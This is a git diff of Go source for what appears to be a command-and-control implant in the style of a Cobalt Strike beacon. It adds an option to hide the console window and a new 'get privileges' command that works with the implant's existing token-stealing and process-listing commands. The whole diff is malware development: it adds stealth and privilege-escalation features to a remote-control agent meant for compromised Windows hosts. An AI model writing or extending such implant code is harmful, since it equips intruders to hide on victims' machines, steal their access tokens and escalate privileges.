@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"errors"
+	"fmt"
 	"main/config"
 	"main/crypt"
 	"main/packet"
@@ -13,7 +14,14 @@ import (
 )
 
 func main() {
-
+	if config.HideConsole {
+		dataConsole, errConsole := packet.HideConsole()
+		if errConsole != nil {
+			fmt.Println(errConsole)
+		} else {
+			fmt.Println(string(dataConsole))
+		}
+	}
 	ok := packet.FirstBlood()
 	if ok {
 		var Token uintptr
@@ -106,6 +114,9 @@ func main() {
 								callbackType = 0
 							case packet.CMD_TYPE_STEAL_TOKEN:
 								Token, result, err = services.CmdStealToken(cmdBuf)
+								callbackType = 0
+							case packet.CMD_TYPE_GET_PRIVS:
+								result, err = services.CmdGetPrivs(cmdBuf, Token)
 								callbackType = 0
 							case packet.CMD_TYPE_PS:
 								result, err = services.CmdPs(cmdBuf)
